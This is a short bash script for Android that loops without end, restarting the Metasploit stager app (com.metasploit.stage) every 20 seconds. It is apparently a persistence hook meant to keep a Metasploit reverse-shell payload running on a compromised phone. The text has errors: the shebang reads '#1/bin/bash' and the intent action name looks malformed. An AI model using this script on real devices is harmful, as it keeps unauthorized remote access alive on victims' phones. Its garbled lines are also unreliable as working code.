#1/bin/bash
while :
do am start  --user 0 -a android.internet.action.MAIN -n
com.metasploit.stage/.MainActivity
sleep 20
done